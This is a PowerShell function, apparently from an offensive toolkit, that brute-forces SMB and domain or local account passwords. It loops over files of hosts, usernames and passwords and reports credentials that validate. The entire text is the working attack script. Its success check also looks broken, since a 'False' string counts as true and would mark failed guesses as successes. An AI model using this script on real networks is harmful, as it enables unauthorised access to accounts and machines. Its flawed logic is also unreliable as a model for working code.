function Invoke-SMBBruteForce {

    [CmdletBinding()] Param(
        [Parameter(Mandatory = $False,ValueFromPipeline=$True)]
        [String] $ComputerName,

        [parameter(Mandatory = $True)]
        [String] $UserName,

        [parameter(Mandatory = $True)]
        [String] $Password,

        [parameter(Mandatory = $False)]
        [Switch] $NoPing
    )

    Begin {
        Set-StrictMode -Version 2
        Try {Add-Type -AssemblyName System.DirectoryServices.AccountManagement}
        Catch {Write-Error $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage}
    }

    Process {

        $ComputerNames = Get-Content $ComputerName
        $Usernames = Get-Content $UserName
        $Passwords = Get-Content $Password
        $flag = 0
        foreach ($Computer in $ComputerNames){     
            if($flag -eq 1){
                $flag = 0
                continue
            }
            Try {
                
                Write-Output "Checking: $Computer"

                $up = $true
                if(-not $NoPing){
                    $up = Test-Connection -count 1 -Quiet -ComputerName $Computer 
                }
                if($up){
                    
                    foreach($Username in $Usernames){
                        if($flag -eq 1){
                            break
                        }
                        foreach($Password in $Passwords){
                            if ($Username.contains("\\")) {
                                # if there's a \ in the username, assume we're checking a domain account
                                $ContextType = [System.DirectoryServices.AccountManagement.ContextType]::Domain
                            }
                            else{
                                # otherwise assume a local account
                                $ContextType = [System.DirectoryServices.AccountManagement.ContextType]::Machine
                            }

                            $PrincipalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($ContextType, $Computer)
                        
                            $Valid = $PrincipalContext.ValidateCredentials($Username, $Password).ToString()
                            
                            If ($Valid) {
                                Write-Verbose "SUCCESS: $Username works with $Password on $Computer"

                                $out = new-object psobject
                                $out | add-member Noteproperty 'ComputerName' $Computer
                                $out | add-member Noteproperty 'Username' $Username
                                $out | add-member Noteproperty 'Password' $Password
                                $out
                                $flag = 1
                                break
                    
                            }
                            Else {
                                continue
                            }
                        }
                    }

                }
            }

            Catch {
                continue
            }
        }
    }
}